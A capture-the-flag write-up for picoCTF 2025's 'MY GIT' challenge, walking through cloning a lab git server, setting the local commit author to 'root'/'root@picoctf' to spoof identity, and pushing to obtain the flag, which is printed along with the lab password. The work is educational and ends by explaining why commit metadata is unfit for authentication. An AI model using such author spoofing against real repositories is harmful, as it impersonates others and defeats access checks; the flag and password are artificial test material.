# MY GIT
**Category:** Binary Exploitation
**Difficulty:** Easy
**Points:** 100
**CTF:** picoCTF 2025
---
## Description
I have built my own Git server with my own rules! You can clone the challenge
repo using the command below. Check the README to get your flag!
**Hints:**
- What does the README say?
- Can you spoof a git commit author?
---
## Approach
The challenge gave a git clone command with SSH credentials to connect to a
custom git server. I cloned the repository and read the README which revealed
that the server would only update flag.txt if it was pushed by the author
root with the email root@picoctf. This is a git identity spoofing challenge.
Git stores the author name and email locally in the git config and attaches
them to every commit — the server checks this metadata to verify identity.
Since git never actually verifies that you are who you say you are I could
simply configure my local git identity to match root:root@picoctf and push
a flag.txt file. The server accepted the commit, matched the author identity
and printed the flag in the push output.
---
## Solution
### Step 1 - Clone the repository
```bash
git clone ssh://git@foggy-cliff.picoctf.net:55094/git/challenge.git
```
Enter the password when prompted:
32a53fa0
Output: Repository cloned successfully into the challenge folder
### Step 2 - Navigate into the cloned repo
```bash
cd challenge
```
### Step 3 - Read the README
```bash
cat README.md
```
Output:
MyGit
If you want the flag, make sure to push the flag!
Only flag.txt pushed by root:root@picoctf will be updated with the flag.
GOOD LUCK!
The server checks that flag.txt is committed by the author root with the
email root@picoctf — git identity must be spoofed to match this exactly.
### Step 4 - Spoof the git identity
Configure local git to impersonate the required author:
```bash
git config user.name "root"
git config user.email "root@picoctf"
```
Note: Using --local (default) keeps this change only inside this repo and
does not affect your global git identity.
### Step 5 - Create flag.txt and commit it
```bash
echo "flag" > flag.txt
git add flag.txt
git commit -m "add flag"
```
Output: Committed as root with email root@picoctf
### Step 6 - Push to the server
```bash
git push origin master
```
Enter the password when prompted:
32a53fa0
Output: Server verified the author identity and printed the flag!
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_f3a6488d}
---
## Tools Used
- git clone - cloning the remote challenge repository over SSH
- cat - reading the README to understand the server's identity requirement
- git config - spoofing the local author name and email to impersonate root
- git push - pushing the flag.txt commit to trigger the server identity check
---
## Flag
picoCTF{1mp3rs0n4t4_g17_345y_f3a6488d}
---
## What I Learned
- Git never cryptographically verifies author identity — user.name and
  user.email in git config can be set to anything and will be attached to
  every commit without any verification
- The server used commit metadata (author name and email) as an access
  control mechanism which is trivially bypassable since git config is
  fully under the user's control
- git config without --global applies the setting only to the local repo
  which is good practice to avoid polluting the global git identity
- Always read the README first in any challenge — the entire solution was
  spelled out directly in the README file
- This is why real systems should never rely on git commit metadata for
  authentication — GPG signed commits are the only way to cryptographically
  verify author identity in git
